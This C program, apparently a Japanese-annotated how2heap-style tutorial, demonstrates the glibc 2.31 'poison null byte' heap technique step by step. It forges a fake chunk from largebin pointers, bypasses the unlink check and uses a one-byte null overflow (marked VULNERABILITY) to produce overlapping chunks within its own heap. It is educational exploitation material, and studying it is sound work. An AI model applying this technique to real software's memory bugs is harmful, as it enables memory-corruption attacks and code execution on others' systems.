#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

int main()
{
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	puts("poison null byte へようこそ!");
	puts("Ubuntu 20.04 64bit でテストしています。");
	puts("この技法は、malloc された領域に対して、ヌルバイトによる off-by-one(1 バイトのずれ)がある場合に使えます。");

	puts("実装の詳細の一部は https://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/off_by_null.c から借りています\n");

	// step0: tcache のメタデータの確保を強制して、邪魔されないようにします
	free(malloc(0x30));

	// step1: パディングを確保します
	puts("Step1: 偽のチャンクのアドレスの下位 2 バイト目が \\x00 になるよう、大きなパディングを確保します");
	void *tmp = malloc(0x1);
	void *heap_base = (void *)((long)tmp & (~0xfff));
	printf("ヒープのアドレス: %p\n", heap_base);
	size_t size = 0x10000 - ((long)tmp&0xffff) - 0x20;
	printf("パディング用チャンクのサイズを計算します: 0x%lx\n", size);
	puts("パディングを確保します。下位 2 バイトを上書きするため、4 ビットのブルートフォース(bruteforce)を避けるのに必要です。");
	void *padding= malloc(size);

	// step2: prev チャンクと victim チャンクを確保します
	puts("\nStep2: 互いに隣接する 2 つのチャンクを確保します。");
	puts("1 つ目を 'prev'、2 つ目を 'victim' と呼びましょう。");
	void *prev = malloc(0x500);
	void *victim = malloc(0x4f0);
	puts("統合(consolidation)を避けるために malloc(0x10) します");
	malloc(0x10);
	printf("prev チャンク: malloc(0x500) = %p\n", prev);
	printf("victim チャンク: malloc(0x4f0) = %p\n", victim);

	// step3: prev を largebin にリンクします
	puts("\nStep3: prev を largebin にリンクします");
	puts("この手順は、後で偽のチャンクを偽造するために必要です");
	puts("prev の fd_nextsize と bk_nextsize が、偽のチャンクの fd ポインタと bck ポインタになります");
	puts("prev よりサイズが少し小さいチャンク 'a' を確保します");
	void *a = malloc(0x4f0);
	printf("a: malloc(0x4f0) = %p\n", a);
	puts("統合(consolidation)を避けるために malloc(0x10) します");
	malloc(0x10);
	puts("prev よりサイズが少し大きいチャンク 'b' を確保します");
	void *b = malloc(0x510);
	printf("b: malloc(0x510) = %p\n", b);
	puts("統合(consolidation)を避けるために malloc(0x10) します");
	malloc(0x10);

	puts("\n現在のヒープレイアウト\n"
		 "    ... ...\n"
		 "padding\n"
		 "    prev Chunk(addr=0x??0010, size=0x510)\n"
     	 "  victim Chunk(addr=0x??0520, size=0x500)\n"
		 " barrier Chunk(addr=0x??0a20, size=0x20)\n"
		 "       a Chunk(addr=0x??0a40, size=0x500)\n"
		 " barrier Chunk(addr=0x??0f40, size=0x20)\n"
		 "       b Chunk(addr=0x??0f60, size=0x520)\n"
		 " barrier Chunk(addr=0x??1480, size=0x20)\n");

	puts("ここで a、b、prev を解放します");
	free(a);
	free(b);
	free(prev);
	puts("現在の unsorted_bin:  header <-> [prev, size=0x510] <-> [b, size=0x520] <-> [a, size=0x500]\n");

	puts("ソートを有効にするため、巨大なチャンクを確保します");
	malloc(0x1000);
	puts("現在の large_bin:  header <-> [b, size=0x520] <-> [prev, size=0x510] <-> [a, size=0x500]\n");

	puts("これにより a、b、prev が largebin に追加されます\nこれで prev は largebin にあります");
	printf("prev の fd_nextsize は a を指しています: %p\n", ((void **)prev)[2]+0x10);
	printf("prev の bk_nextsize は b を指しています: %p\n", ((void **)prev)[3]+0x10);

	// step4: prev を再度確保して、偽のチャンクを構築します
	puts("\nStep4: prev を再度確保して、偽のチャンクを構築します");
	puts("large chunk はサイズ順にソートされており、a のサイズは prev より小さいので、");
	puts("以前と同様に 0x500 を確保して prev を取り出せます");
	void *prev2 = malloc(0x500);
	printf("prev2: malloc(0x500) = %p\n", prev2);
	puts("これで prev2 == prev となり、prev2->fd == prev2->fd_nextsize == a、prev2->bk == prev2->bk_nextsize == b となります");
	assert(prev == prev2);

	puts("偽のチャンクは prev に含まれ、そのサイズは prev のサイズより 0x10 小さくなります");
	puts("そのため、サイズを 0x501 (0x510-0x10 | フラグ) に設定します");
	((long *)prev)[1] = 0x501;
	puts("さらに、size==prev_size(next_chunk) のチェックを回避するため、その prev_size(next_chunk) を 0x500 に設定します");
	*(long *)(prev + 0x500) = 0x500;
	printf("偽のチャンクは次の位置にあるはずです: %p\n", prev + 0x10);
	puts("prev の fd_nextsize と bk_nextsize を fake_chunk の fd と bk として使います");
	puts("これで fake_chunk->fd == a、fake_chunk->bk == b となりました");

	// step5: unlink を回避します
	puts("\nStep5: 残存ポインタを操作して、後の unlink を回避します。");
	puts("まず 0x510 を確保して b を取り出します");
	void *b2 = malloc(0x510);
	printf("b に残存ポインタがあるため、現時点で b->fd は a を指しています: %p\n", ((void **)b2)[0]+0x10);
	printf("下位 2 バイトを上書きして、これを偽のチャンクにできます。\n"
			"下位 2 バイト目が \\x00 でない場合は、今ここで何を書くかを推測する必要があります\n");
	((char*)b2)[0] = '\x10';
	((char*)b2)[1] = '\x00';  // b->fd <- fake_chunk
	printf("上書き後、b->fd は %p で、これは偽のチャンクへのチャンクポインタです\n", ((void **)b2)[0]);

	puts("a にも同じことをするため、まず a を unsorted bin に移します。"
			"largebin から取り出して、unsortedbin に解放します");
	void *a2 = malloc(0x4f0);
	free(a2);
	puts("ここで victim を unsortedbin に解放し、a->bck が victim を指すようにします");
	free(victim);
	printf("a->bck: %p、victim: %p\n", ((void **)a)[1], victim);
	puts("再び a を取り出して、a->bck を偽のチャンクに上書きします");
	void *a3 = malloc(0x4f0);
	((char*)a3)[8] = '\x10';
	((char*)a3)[9] = '\x00';
	printf("上書き後、a->bck は %p で、これは偽のチャンクへのチャンクポインタです\n", ((void **)a3)[1]);
	// malloc.c の unlink_chunk を通過します:
	//      mchunkptr fd = p->fd;
	//      mchunkptr bk = p->bk;
	//      if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
	//          malloc_printerr ("corrupted double-linked list");
	puts("これで次のようになります:\n"
		 "fake_chunk->fd->bk == a->bk == fake_chunk\n"
		 "fake_chunk->bk->fd == b->fd == fake_chunk\n"
		 );

	// step6: off-by-null で偽のチャンクを unsorted bin に追加します
	puts("\nStep6: 後方への統合(backward consolidation)を使って、偽のチャンクを unsortedbin に追加します");
	puts("victim を unsortedbin から取り出します");
	void *victim2 = malloc(0x4f0);
	printf("%p\n", victim2);
	puts("victim のサイズに off-by-null を行います");
	/* VULNERABILITY */
	((char *)victim2)[-8] = '\x00';
	/* VULNERABILITY */

	puts("ここで victim を解放すると、libc は偽のチャンクを victim の上にある解放済みチャンクだと思い込みます\n"
			"そして偽のチャンクを unlink して、victim を偽のチャンクと後方に統合しようとし、\n"
			"統合したチャンクを unsortedbin に追加します。"
			);
	printf("偽のチャンクについては、step4 で行ったことにより、\n"
			"現在 P->fd->bk(%p) == P(%p)、P->bk->fd(%p) == P(%p) となっているので、\n"
			"unlink は成功します\n", ((void **)a3)[1], prev, ((void **)b2)[0], prev);
	free(victim);
	puts("victim を解放すると、新たに統合されたチャンクが unsorted bin に追加されます。"
			"そしてそれは prev チャンクと重なっています");

	// step7: chunk overlapping を検証します
	puts("それでは chunk overlapping を検証しましょう");
	void *merged = malloc(0x100);
	printf("merged: malloc(0x100) = %p\n", merged);
	memset(merged, 'A', 0x80);
	printf("現在の merged の内容: %s\n", (char *)merged);

	puts("prev の内容を上書きします");
	memset(prev2, 'C', 0x80);
	printf("merged の内容が次のように変わりました: %s\n", (char *)merged);

	assert(strstr(merged, "CCCCCCCCC"));
}
